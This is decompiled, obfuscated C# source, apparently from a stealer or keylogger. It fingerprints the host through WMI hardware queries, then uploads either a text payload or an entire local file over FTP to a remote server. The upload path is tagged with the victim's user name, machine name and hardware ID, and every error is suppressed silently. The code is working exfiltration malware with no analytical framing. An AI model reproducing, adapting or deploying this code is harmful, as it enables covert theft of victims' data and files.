using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class jJNOnNgWhS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string cMSpVshzWXgKIq()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107403954));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107403965)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107403948);
		ManagementObject val3 = new ManagementObject(getString_0(107403943) + text2 + getString_0(107403902));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107403865)).ToString();
		return text3 + text;
	}

	public static void eJmCghSDKXkKiu(string URrkBiBcvFVR = "URL", string tutGmeOOliOWdd = "USERNAME", string xIOYxuNTLX = "ACCESO", string RcQDDbsKgP = "")
	{
		try
		{
			string text = cMSpVshzWXgKIq();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(URrkBiBcvFVR + getString_0(107406653) + Environment.UserName + getString_0(107406608) + Environment.MachineName + getString_0(107406587) + text + getString_0(107406582));
			ftpWebRequest.Method = getString_0(107403872);
			ftpWebRequest.Credentials = new NetworkCredential(tutGmeOOliOWdd, xIOYxuNTLX);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(RcQDDbsKgP);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void BqAVxlRXrfWmNzV(string aWCqGYnufaLshk = "URL", string EiufaJkwhRr = "USERNAME", string DVHjrJIEBU = "ACCESO", string xQpqFCzvzoRvdnAN = "")
	{
		try
		{
			string text = cMSpVshzWXgKIq();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(aWCqGYnufaLshk + getString_0(107406653) + Environment.UserName + getString_0(107406608) + Environment.MachineName + getString_0(107406587) + text + getString_0(107406587) + Path.GetFileName(xQpqFCzvzoRvdnAN));
			ftpWebRequest.Method = getString_0(107403872);
			ftpWebRequest.Credentials = new NetworkCredential(EiufaJkwhRr, DVHjrJIEBU);
			byte[] array = File.ReadAllBytes(xQpqFCzvzoRvdnAN);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static jJNOnNgWhS()
	{
		Strings.CreateGetStringDelegate(typeof(jJNOnNgWhS));
	}
}
